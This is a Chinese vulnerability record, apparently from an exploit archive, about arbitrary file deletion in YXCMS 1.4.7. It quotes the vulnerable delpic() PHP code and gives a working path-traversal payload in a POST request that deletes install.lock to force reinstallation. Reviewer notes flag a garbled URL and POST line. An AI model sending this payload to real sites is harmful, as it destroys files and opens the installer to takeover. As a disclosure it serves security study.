---
source: "hatch 补库批 20260928"
product: "YXCMS1.4.7"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YXCMS 1.4.7任意文件删除"
prerequisites: "来源所述条件，未列明部分仍待核：backendphotoaccess; processdeletepermissions; installerpresent"
side_effects: "未执行；本文需注意的操作影响：代码先删原文件再报缩略图不存在，失败提示仍有副作用这一点重要应保留；URL把?与=编码在路径，POST行混入后续解释，需恢复；删除锁不代表可完成重装，DB/安装参数及数据破坏条件未说明"
source_status: "unknown"
id: "vw-7e6a32447a19ac5dd4d73d6a"
entity_id: "ve-7e6a32447a19ac5dd4d73d6a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：backendphotoaccess; processdeletepermissions; installerpresent

- **操作与副作用边界（1）**：代码先删原文件再报缩略图不存在，失败提示仍有副作用这一点重要应保留。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（2）**：URL把?与=编码在路径，POST行混入后续解释，需恢复。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：删除锁不代表可完成重装，DB/安装参数及数据破坏条件未说明。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（4）**：与629不同controller/参数/递归能力，不能同文去重；无修复/来源。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YXcms 1.4.7 任意文件删除

一、漏洞简介
------------

二、漏洞影响
------------

YXcms 1.4.7

三、复现过程
------------

### 漏洞分析

漏洞文件：protected/apps/admin/controller/photoController.php,在第355行的delpic()函数，可以看到\$picname接收POST过来的值，然后\$path等于文件开头定义的静态变量
static protected \$uploadpath=\'\';//图片上传路径
没有对传入的值进行任何的过滤，使用函数file\_exists()判断一下文件是否存在就给unlink执行删除文件了。

    public function delpic()
    {
        if(empty($_POST['picname'])) $this->error('参数错误~');
        $picname=$_POST['picname'];
        $path=$this->uploadpath;
        if(file_exists($path.$picname))
          @unlink($path.$picname);
        else{echo '图片不存在~';return;} 
        if(file_exists($path.'thumb_'.$picname))
           @unlink($path.'thumb_'.$picname);
        else {echo '缩略图不存在~';return;}
        echo '原图以及缩略图删除成功~';
    }

### 复现

需要先登录后台，然后访问之后会显示缩略图不存在

payload

    http://0-sec.org/index.php%3Fr%3Dadmin/photo/delpic

POST：

    picname=../../protected/apps/install/install.lock然后访问网站首页就会自动转到安装的页面看到目录下的install.lock文件已经被删除了